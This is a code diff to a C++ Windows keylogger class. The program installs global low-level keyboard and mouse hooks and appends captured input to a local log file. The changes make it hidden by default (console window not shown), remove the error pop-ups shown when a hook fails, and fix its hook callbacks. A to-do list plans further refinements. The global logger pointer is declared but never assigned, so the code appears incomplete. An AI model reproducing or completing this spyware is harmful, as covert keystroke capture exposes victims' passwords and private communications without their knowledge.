@@ -45,7 +45,7 @@ class KeyLogger {
 		};
 		HHOOK hKeybdHook;    //will point to handle to the KEYBOARD hook procedure.
 		HHOOK hMouseHook;    //will point to handle to the MOUSE hook procedure.
-		const char* output_filename; //TODO: protect length of this char[]. maybe: give default filename / shorten if its too long?
+		const char* output_filename;
 		std::ofstream output_file;	//handle to log file
 		int mouse_direction_modifier;
 
@@ -215,12 +215,16 @@ class KeyLogger {
 			return 0;
 		}
 
+		
+		static LRESULT __stdcall LowLvlKeybdHookCallback(int nCode, WPARAM wParam, LPARAM lParam);
+		static LRESULT __stdcall LowLvlMouseHookCallback(int nCode, WPARAM wParam, LPARAM lParam);
+
 	public:
 		// Constructor
-		KeyLogger (char* output_filename, bool visible)
+		KeyLogger ()
 		{
-			this->visible = visible;
-			this->output_filename = ".\\logfile.log";	//DEFAULT - change this
+			this->visible = false;						//DEFAULT - change this!!
+			this->output_filename = ".\\logfile.log";	//DEFAULT - change this!!
 			this->mouse_direction_modifier = 1; // direction - right
 			if (this->visible) {
 				ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1); // visible window
@@ -232,71 +236,78 @@ class KeyLogger {
 			this->output_file.open(this->output_filename, std::ios_base::app);
 		}
 
-		LRESULT __stdcall LowLvlKeybdHookCallback(int nCode, WPARAM wParam, LPARAM lParam);
-		LRESULT __stdcall LowLvlMouseHookCallback(int nCode, WPARAM wParam, LPARAM lParam);
-
 		// hook SETTER functions
 		void SetLowLvLKeybdHook()
 		{
+			this->hKeybdHook = SetWindowsHookEx(WH_KEYBOARD_LL, &LowLvlKeybdHookCallback, NULL, 0);
+			/*
 			if (!(this->hKeybdHook = SetWindowsHookEx(WH_KEYBOARD_LL, &LowLvlKeybdHookCallback, NULL, 0)))
 			{
 				LPCWSTR lpText = L"Failed to install keyboard hook!";
 				LPCWSTR lpCaption = L"Error";
 				MessageBox(NULL, lpText, lpCaption, MB_ICONERROR);
 			}
+			*/
 		}
 		void SetLowLvlMouseHook()
 		{
+			this->hMouseHook = SetWindowsHookEx(WH_MOUSE_LL, &LowLvlMouseHookCallback, NULL, 0);
+			/*
 			if (!(this->hMouseHook = SetWindowsHookEx(WH_MOUSE_LL, &LowLvlMouseHookCallback, NULL, 0)))
 			{
 				LPCWSTR lpText = L"Failed to install mouse hook!";
 				LPCWSTR lpCaption = L"Error";
 				MessageBox(NULL, lpText, lpCaption, MB_ICONERROR);
 			}
+			*/
 		}
 
 		// hook RELEASER functions
 		void ReleaseLowLvlKeybdHook()
 		{
-			UnhookWindowsHookEx(this->hKeybdHook);
+			if (this->hKeybdHook) {
+				UnhookWindowsHookEx(this->hKeybdHook);
+			}
 		}
 		void ReleaseLowLvlMouseHook()
 		{
-			UnhookWindowsHookEx(this->hMouseHook);
+			if (this->hMouseHook) {
+				UnhookWindowsHookEx(this->hMouseHook);
+			}
 		}
 };
 
 
-extern KeyLogger* logger_obj (false);
+extern KeyLogger* KeyLogger_obj;
 
 
-LRESULT __stdcall KeyLogger::LowLvlKeybdHookCallback(int nCode, WPARAM wParam, LPARAM lParam)
+LRESULT CALLBACK KeyLogger::LowLvlKeybdHookCallback(int nCode, WPARAM wParam, LPARAM lParam)
 {
 	if (nCode < 0) {    // do not process the message if nCode less than 0
-		return CallNextHookEx(this->hKeybdHook, nCode, wParam, lParam);
+		return CallNextHookEx(0, nCode, wParam, lParam);
 	}
 	
-	bool call_next = logger_obj->OnLLKeybdHook(int nCode, WPARAM wParam, LPARAM lParam);
+	bool call_next = KeyLogger_obj->OnLLKeybdHook(nCode, wParam, lParam);
 	//bool call_next = this->OnLLKeybdHook(int nCode, WPARAM wParam, LPARAM lParam);
 	if (call_next) 
 	{
-		return CallNextHookEx(this->hKeybdHook, nCode, wParam, lParam);
+		return CallNextHookEx(0, nCode, wParam, lParam);
 	}
 
 }
-LRESULT __stdcall KeyLogger::LowLvlMouseHookCallback(int nCode, WPARAM wParam, LPARAM lParam) 
+LRESULT CALLBACK KeyLogger::LowLvlMouseHookCallback(int nCode, WPARAM wParam, LPARAM lParam) 
 
 {
 	if (nCode < 0) // do not process the message if nCode less than 0
 	{
-		return CallNextHookEx(this->hMouseHook, nCode, wParam, lParam);
+		return CallNextHookEx(0, nCode, wParam, lParam);
 	}
 
-	bool call_next = logger_obj->OnLLMouseHook(int nCode, WPARAM wParam, LPARAM lParam);
+	bool call_next = KeyLogger_obj->OnLLMouseHook(nCode, wParam, lParam);
 	//bool call_next = this->OnLLMouseHook(int nCode, WPARAM wParam, LPARAM lParam);
 	if (call_next)
 	{
-		return CallNextHookEx(this->hMouseHook, nCode, wParam, lParam);
+		return CallNextHookEx(0, nCode, wParam, lParam);
 	}
 }
 
@@ -305,8 +316,8 @@ LRESULT __stdcall KeyLogger::LowLvlMouseHookCallback(int nCode, WPARAM wParam, L
 int main()
 {
 	// setting hooks
-	logger_obj.SetLowLvLKeybdHook();
-	logger_obj.SetLowLvlMouseHook();
+	KeyLogger_obj->SetLowLvLKeybdHook();
+	KeyLogger_obj->SetLowLvlMouseHook();
 
 	// loop to keep the console application running.
 	MSG msg;
@@ -317,8 +328,19 @@ int main()
 	}
 
 	// releasing hooks
-	logger_obj.ReleaseLowLvlKeybdHook();
-	logger_obj.ReleaseLowLvlMouseHook();
+	KeyLogger_obj->ReleaseLowLvlKeybdHook();
+	KeyLogger_obj->ReleaseLowLvlMouseHook();
 
 	return 0;
 }
+
+
+
+// TODO:
+/*
+- move hook setting to constructor, and add destructor for unhooking
+- add parameterized constructors overloads.
+- protect char[] buffers/make default logic for cases of too long params.
+- add periodic close + reopen of log file to save.
+*/
+
